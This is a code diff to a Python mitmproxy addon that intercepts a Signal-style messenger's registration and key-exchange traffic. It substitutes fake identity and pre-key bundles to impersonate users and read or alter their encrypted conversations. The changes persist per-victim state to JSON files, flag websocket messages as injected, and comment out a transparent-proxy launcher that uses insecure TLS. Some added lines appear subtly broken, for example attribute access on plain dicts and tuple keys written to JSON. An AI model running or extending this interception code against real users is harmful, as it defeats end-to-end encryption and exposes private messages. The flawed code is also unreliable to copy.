@@ -101,6 +101,7 @@ class RegistrationInfo():
     aciData: KeyData = None
     pniData: KeyData = None
 
+    serialized_registration_req : Optional[dict] = None
 
 @dataclass
 class BobIdenKey():
@@ -112,6 +113,12 @@ class BobIdenKey():
 registration_info: dict[str, RegistrationInfo] = dict()
 conversation_session = dict()
 bobs_bundle = dict()
+f = open('registration_info.json', 'w')
+f.write("{}")
+f.close()
+f = open('conversation_info.json', 'w')
+f.write("{}")
+f.close()
 
 api = addons[0]
 
@@ -121,7 +128,16 @@ def _v1_registration(flow: HTTPFlow):
     # logging.info(f"ADDRESS {flow.client_conn.address[0]}")
 
     req = json.loads(flow.request.content)
-    # logging.info(json.dumps(req, indent=4))
+
+    with open("registration_info.json", "r") as f:
+        registration_info = json.loads(f.read())
+    # todo: is this the first time?
+    
+    already_saved = registration_info.get(flow.client_conn.address[0])
+    if already_saved:
+        logging.warning(f"Already saved {already_saved}. Serving the same bundle")
+        flow.request.content = json.dumps(already_saved.serialized_registration_req).encode()
+        return
 
     qry = Device.select().where(Device.aciIdenKey == req["aciIdentityKey"])
 
@@ -175,17 +191,22 @@ def _v1_registration(flow: HTTPFlow):
             fake_lastResortKey=fake_signed_pre_keys["pniPqLastResortPreKey"],
             fake_secret_lastResortKey=fake_secret_SignedPreKeys["pniPqLastResortSecret"]
         )
-
     )
+
+    with open("registration_info.json", "w") as f:
+        f.write(json.dumps(registration_info, indent=4))
 
     flow.request.content = json.dumps(req).encode()
 
 
-@api.route("/v1/registration", rtype=RouteType.RESPONSE)
+@api.route("/v1/registration", rtype=RouteType.RESPONSE, allowed_statuses=[200])
 def _v1_registration(flow: HTTPFlow):
     resp = json.loads(flow.response.content)
     # logging.info(f"RESPONSE: {resp}")
     ip_address = flow.client_conn.address[0]
+
+    with open("registration_info.json", "r") as f:
+        registration_info = json.loads(f.read())
 
     user = User.insert(
         pNumber=resp["number"],
@@ -209,6 +230,9 @@ def _v1_registration(flow: HTTPFlow):
     registration_info[ip_address].aci = resp["uuid"]
     registration_info[ip_address].pni = resp["pni"]
 
+    with open("registration_info.json", "w") as f:
+        f.write(json.dumps(registration_info, indent=4))
+
 
 @api.route("/v2/keys", rtype=RouteType.REQUEST, method=HTTPVerb.PUT)
 def _v2_keys(flow: HTTPFlow):
@@ -216,6 +240,9 @@ def _v2_keys(flow: HTTPFlow):
 
     req = json.loads(flow.request.content)
     address = flow.client_conn.address[0]
+
+    with open("registration_info.json", "r") as f:
+        registration_info = json.loads(f.read())
 
     ## TODO: instead of naming each key for both variables, just use the identifier as a key and the bundle(dict) as the value
     if not registration_info.get(address):
@@ -290,12 +317,21 @@ def _v2_keys(flow: HTTPFlow):
     # prevent regressions
     assert "privateKey" not in req['pqPreKeys'][0]
     assert "privateKey" not in req['preKeys'][0]
+
+    with open("registration_info.json", "w") as f:
+        f.write(json.dumps(registration_info, indent=4))
+
+
     flow.request.content = json.dumps(req).encode()
 
 
 @api.route("/v2/keys/{identifier}/{device_id}", rtype=RouteType.RESPONSE, method=HTTPVerb.GET, allowed_statuses=[200])
 def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
+    # TODO -- I need to be coherent if this endpoint is hit multiple times
     # logging.exception((flow.response.content, identifier, device_id))
+
+    with open("registration_info.json", "r") as f:
+        registration_info = json.loads(f.read())
 
     resp = json.loads(flow.response.content)
     ip_address = flow.client_conn.address[0]
@@ -387,7 +423,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
             "devices": [
                 {
                     "deviceId": 1,
-                    "registrationId": fakeBundle["registration_id"],
+                    "registrationId": bundle["registrationId"],
                     "preKey": {
                         "keyId": fakeBundle["pre_key_id"],
                         "publicKey": fakeBundle["pre_key_public"]
@@ -452,17 +488,30 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
         mitm_bundle.on_conflict_replace().execute()
 
     resp.update(fakeBundle_wire)
-    conversation_session[(ip_address, identifier)] = (fakeVictim, fakeUser)
+
+    with open("conversation_info.json", "r") as f:
+        conversation_session = json.loads(f.read())
+
+    conversation_session[(ip_address, uuid)] = (fakeVictim, fakeUser)
     #logging.warning(f"session {conversation_session}")
 
     assert "privateKey" not in resp['devices'][0]['pqPreKey']
     assert "privateKey" not in resp['devices'][0]['signedPreKey']
     assert "privateKey" not in resp['devices'][0]['pqPreKey']
+    
+    with open("conversation_info.json", "w") as f:
+        f.write(json.dumps(conversation_session, indent=4))
+
+    with open("registration_info.json", "w") as f:
+        f.write(json.dumps(registration_info, indent=4))
     flow.response.content = json.dumps(resp, sort_keys=True).encode()
 
 
 def _v1_ws_my_profile(flow, identifier, version, credentialRequest):
     logging.info(f"my profile: {identifier} {version} {credentialRequest}")
+
+    with open("registration_info.json", "r") as f:
+        registration_info = json.loads(f.read())
 
     resp = json.loads(flow.response.content)
     ip_address = flow.client_conn.address[0]
@@ -474,11 +523,19 @@ def _v1_ws_my_profile(flow, identifier, version, credentialRequest):
 
     resp["identityKey"] = registration_info[ip_address].aciData.IdenKey
     flow.response.content = json.dumps(resp).encode()
+
+    with open("registration_info.json", "w") as f:
+        f.write(json.dumps(registration_info, indent=4))
+
     return flow.response.content
     # raise RuntimeError(f"my profile: {identifier} {version} {credentialRequest}")
 
 
 def _v1_ws_profile_futut(flow, identifier, version):
+    with open("registration_info.json", "r") as f:
+        registration_info = json.loads(f.read())
+
+
     logging.info(f"my profile 2: {identifier} {version}")
     # raise RuntimeError(f"my profile: {identifier} {version}")
     resp = json.loads(flow.response.content)
@@ -492,6 +549,10 @@ def _v1_ws_profile_futut(flow, identifier, version):
 
     resp["identityKey"] = registration_info[ip_address].aciData.IdenKey
     flow.response.content = json.dumps(resp).encode()
+    
+    with open("registration_info.json", "w") as f:
+        f.write(json.dumps(registration_info, indent=4))
+
     return flow.response.content
 
 
@@ -541,6 +602,9 @@ def _v1_ws_message(flow, identifier):
     destination_user = req["destination"]
 
     identifier, destination = strip_uuid_and_id(destination_user)
+
+    with open("conversation_info.json", "r") as f:
+        conversation_session = json.loads(f.read())
 
     session = conversation_session.get((ip_address, destination))
 
@@ -620,7 +684,9 @@ def _v1_websocket_req(flow: HTTPFlow, msg):
     ws_msg = WebSocketMessage()
     ws_msg.ParseFromString(msg.content)
     ws_msg = ws_msg.request
-    logging.info(f"WEBSOCKET: {ws_msg}")
+    logging.info(f"WEBSOCKET REQUEST: {ws_msg}")
+    msg.injected = True
+
 
     id = ws_msg.id
     if websocket_open_state.get(id):
@@ -641,6 +707,7 @@ def _v1_websocket_req(flow: HTTPFlow, msg):
     if "messages" in path:
         assert handler is not None, f"something went terriblu: {path}"
     if handler:
+        msg.injected = True
         req = handler(f, *params.fixed, **params.named)
         if req:
             # msg. = resp
@@ -655,7 +722,9 @@ def _v1_websocket_resp(flow: HTTPFlow, msg):
     ws_msg = WebSocketMessage()
     ws_msg.ParseFromString(msg.content)
     ws_msg = ws_msg.response
-    logging.info(f"WEBSOCKET: {ws_msg}")
+    logging.info(f"WEBSOCKET RESPONSE: {ws_msg}")
+    msg.injected = True
+
 
     id = ws_msg.id
 
@@ -679,6 +748,7 @@ def _v1_websocket_resp(flow: HTTPFlow, msg):
     if "profile" in path:
         assert handler is not None, f"something went terriblu: {path}"
     if handler:
+        msg.injected = True
         resp = handler(f, *params.fixed, **params.named)
         if resp:
             # msg. = resp
@@ -690,24 +760,24 @@ def _v1_websocket_resp(flow: HTTPFlow, msg):
 
 addons = [api]
 
-from mitmproxy.tools.main import mitmdump
+# from mitmproxy.tools.main import mitmdump
 
-if __name__ == "__main__":
-  import time
-  import config
-  flow_name = f"debug_{int(time.time())}.flow"
-  mitmdump(
-    [
-      # "-q",   # quiet flag, only script's output
-      "--mode",
-      "transparent",
-      "--showhost",
-      "--ssl-insecure",
-      "--ignore-hosts",
-      config.IGNORE_HOSTS,
-      "-s",   # script flag
-      __file__,# use the same file as the hook
-      "-w",
-      flow_name
-    ]
-  )
+# if __name__ == "__main__":
+#   import time
+#   import config
+#   flow_name = f"debug_{int(time.time())}.flow"
+#   mitmdump(
+#     [
+#       # "-q",   # quiet flag, only script's output
+#       "--mode",
+#       "transparent",
+#       "--showhost",
+#       "--ssl-insecure",
+#       "--ignore-hosts",
+#       config.IGNORE_HOSTS,
+#       "-s",   # script flag
+#       __file__,# use the same file as the hook
+#       "-w",
+#       flow_name
+#     ]
+#   )
